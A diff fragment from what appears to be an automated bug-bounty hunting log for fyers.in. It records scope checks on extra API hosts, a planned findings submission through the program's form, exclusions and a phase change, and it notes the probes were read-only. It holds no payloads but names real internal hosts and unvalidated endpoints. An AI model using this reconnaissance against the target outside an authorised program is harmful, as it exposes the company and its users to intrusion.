+NEXT_STEP_2: Operator extends scope-confirm with C9 (api-i1.fyers.in / ipo.fyers.in, absent from both public configs) + submits package (A1–A7 + B + C + D + E1–E7 + F) via forms.fyers.in BugBountyForm1; no pre-auth order payloads, no OTP, no cross-account.
+NEXT_STEP_3: Exclusions unchanged (SmartHunt SSTI false positive 4×, third-party hosts, fydev.tech / fyers.co.in dev-staging twins, public config artifacts); guardrails hold.
+
+Deliverables this run (all on disk, committed `9fc081a`): findings appended to `findings_deepseek.md`, submission package Section F re-created (env reset had wiped it) with A7/H22, B9, E7 exact request shapes + OAuth client id, state + analyst note updated. Zero live side-effects; all probes read-only and spaced.
+
 SMARTHUNT DEEP-SCAN REPORT (read it; verify hypotheses it raised):
 # Evidence needed — not yet reportable
 
@@ -1380,7 +1445,7 @@ Read-only verified. Program-consistent scope: target + subdomains.
 - `dox` client-type header unknown; `nomos` 401-auth; fundtx session-gated; Discourse search no secrets; superhuman `.grammarlyaws` 000; `ignite` (mimo EDIS) unvalidated.
 ===== CURRENT STATE =====
 TARGET: fyers.in
-PHASE: POC
+PHASE: SURFACE
 STATUS: IN_PROGRESS
 
 ===== YOUR TASK =====
